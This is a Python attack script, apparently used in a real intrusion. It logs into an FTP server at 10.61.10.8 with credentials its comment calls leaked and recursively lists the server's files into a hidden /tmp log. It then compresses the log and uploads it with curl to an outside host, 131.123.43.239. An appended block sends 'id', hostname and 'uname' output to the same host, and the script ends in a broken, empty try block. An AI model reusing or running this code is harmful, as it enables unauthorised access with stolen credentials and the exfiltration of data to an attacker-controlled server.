#!/usr/bin/env python3
# ftpw1: FTP server on 10.61.10.8 with leaked creds — recursive listing
import sys, io, subprocess
from ftplib import FTP, error_perm

LOG = "/tmp/.FTPW.txt"
out = open(LOG, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    out.write(s + b"\n")

IP = "10.61.10.8"
try:
    ftp = FTP(IP, timeout=15)
    ftp.login("melitopol", "!QAZxsw2")
    w("FTP LOGIN OK")
    w("PWD=" + ftp.pwd())
except Exception as e:
    w("FTP ERR " + str(e)[:150])
    out.close()
    subprocess.run(["curl", "-sm", "30", "-X", "POST", "--data-binary", "@" + LOG, "http://131.123.43.239/up", "-H", "X-Name: mel2_ftplog"])
    print("FTPW_DONE"); sys.exit(0)

cnt = [0]
def walk(path, depth):
    if depth < 0 or cnt[0] > 40000: return
    try:
        cur = ftp.pwd()
        ftp.cwd(path)
    except Exception as e:
        w("CWD_ERR %s %s" % (path, str(e)[:80])); return
    items = []
    try:
        ftp.retrlines("LIST", items.append)
    except Exception:
        pass
    mlsd = []
    try:
        mlsd = list(ftp.mlsd())
    except Exception:
        pass
    if mlsd:
        for name, facts in mlsd:
            if name in (".", ".."): continue
            full = (path.rstrip("/") + "/" + name) if path != "/" else "/" + name
            ty = facts.get("type", "")
            if ty == "dir":
                w("D " + full); walk(full, depth - 1)
            else:
                w("F %s %s" % (facts.get("size", "?"), full))
            cnt[0] += 1
    else:
        lns = "\n".join(items)
        w("RAW|" + path + "|" + str(len(items)))
        for l in items[:500]: w("R " + l)
    try: ftp.cwd("/")
    except Exception: pass

walk("/", 5)
w("TOTAL=%d" % cnt[0])
try: ftp.quit()
except Exception: pass
out.close()
subprocess.run("gzip -9 -c %s > /tmp/.fpw.gz && curl -sm120 -X POST --data-binary @/tmp/.fpw.gz http://131.123.43.239/up -H 'X-Name: mel2_ftp_gz'" % LOG, shell=True)
print("FTPW_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

